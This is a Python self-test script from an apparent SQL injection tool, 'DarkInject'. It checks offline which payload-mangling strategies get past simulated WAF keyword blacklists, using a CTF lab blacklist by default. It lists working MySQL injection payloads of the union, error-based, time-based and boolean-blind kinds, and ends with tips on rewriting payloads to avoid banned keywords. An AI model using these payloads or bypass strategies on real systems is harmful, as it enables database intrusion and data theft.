#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""黑名单绕过自检（离线，不需要目标）

拿一组「工具真实会生成的 payload」，套上 Planner 给出的每种绕过策略，
再放进三种过滤语义模型里模拟 WAF 处理，看结果是否还能还原成原意。

判定标准：
    allowed 且 norm(过滤后) == norm(原始)   →  该策略在此语义下有效

用法:
    python selftest/blacklist_selftest.py [--blacklist FILE]
"""
import argparse
import os
import random
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.blacklist import (build_blacklist, Planner, simulate_filter,  # noqa: E402
                            ALL_MODELS, MODEL_LABEL)
from tamper.chain import TamperChain  # noqa: E402


# 工具真实会生成的代表性 payload（按技术分类）
PAYLOADS = [
    ("联合(数字型)",      "-1 UNION SELECT 1,2,3"),
    ("联合(字符型)",      "-1' UNION SELECT 1,2,3 AND '1'='1"),
    ("报错(extractvalue)", "1 AND (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)))"),
    ("报错(GTID_SUBSET)", "1 AND (GTID_SUBSET(CONCAT(0x7e,(SELECT DATABASE()),0x7e),1))"),
    ("报错(几何函数)",    "1 AND (MULTIPOINT((SELECT DATABASE())))"),
    ("时间(SLEEP)",       "1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),SLEEP(3),0)"),
    ("时间(BENCHMARK)",   "1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),BENCHMARK(10000000,MD5(1)),0)"),
    ("时间(重查询)",      "1 AND IF((1>2),(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C),0)"),
    ("布尔盲注",          "1 AND (ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114)"),
]


def norm(s):
    """归一化：去空白 + 小写（忽略大小写/空白层面的等价差异）。"""
    return re.sub(r"\s+", "", s or "").lower()


def evaluate(bl, strategies):
    """返回 {(payload_idx, model): [通过的策略名]}"""
    result = {}
    for pi, (_, payload) in enumerate(PAYLOADS):
        for model in ALL_MODELS:
            ok = []
            for st in strategies:
                chain = TamperChain(st.tampers, blacklist=bl)
                tampered = chain.apply(payload)
                allowed, out = simulate_filter(tampered, bl.tokens, model)
                if allowed and norm(out) == norm(payload):
                    ok.append(st.name)
            result[(pi, model)] = ok
    return result


def main():
    random.seed(1337)   # randomcase 等随机 tamper 固定种子，保证输出可复现
    ap = argparse.ArgumentParser()
    default_bl = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              "..", "lab", "blacklist_ctf.txt")
    ap.add_argument("--blacklist", default=os.path.normpath(default_bl))
    ap.add_argument("--no-color", action="store_true",
                    help="禁用 ANSI 颜色（输出被重定向时本就会自动禁用）")
    args = ap.parse_args()

    # 颜色：仅在交互式终端下开启，重定向到文件时输出纯文本
    use_color = (not args.no_color) and sys.stdout.isatty()

    # 路径只显示相对仓库根的形式，避免把本机绝对路径写进导出结果
    repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    try:
        shown = os.path.relpath(os.path.abspath(args.blacklist), repo_root)
    except ValueError:      # 不同盘符等无法求相对路径的情况
        shown = args.blacklist
    if shown.startswith(".."):      # 仓库之外的路径，只留文件名
        shown = os.path.basename(args.blacklist)
    shown = shown.replace(os.sep, "/")

    bl = build_blacklist(path=args.blacklist)
    strategies = Planner(bl).strategies()

    print("=" * 78)
    print("  DarkInject — 黑名单绕过自检")
    print("=" * 78)
    print(f"  黑名单: {shown}")
    print(bl.describe())
    print(f"  候选策略: {', '.join(s.name for s in strategies)}")
    print("=" * 78)

    matrix = evaluate(bl, strategies)
    hit = 0
    total = 0

    for pi, (label, payload) in enumerate(PAYLOADS):
        print(f"\n▸ {label}")
        print(f"  payload: {payload}")
        for model in ALL_MODELS:
            ok = matrix[(pi, model)]
            total += 1
            if ok:
                hit += 1
            symbol = "✓" if ok else "✗"
            mark = f"\033[{'92' if ok else '91'}m{symbol}\033[0m" if use_color else symbol
            names = ", ".join(ok) if ok else "（该语义下无可用策略）"
            print(f"    {mark} {MODEL_LABEL[model]:<18} → {names}")

    print("\n" + "=" * 78)
    print(f"  可绕过组合: {hit}/{total}")
    print("  提示: presence(命中即拒) 下，只要 payload 里含任何被禁词就一定被拦，")
    print("        真解法是「换写法避开关键字」（布尔盲注 / 重查询延时 / 非被禁报错函数），")
    print("        而不是指望 tamper 变形。")
    print("=" * 78)


if __name__ == "__main__":
    main()
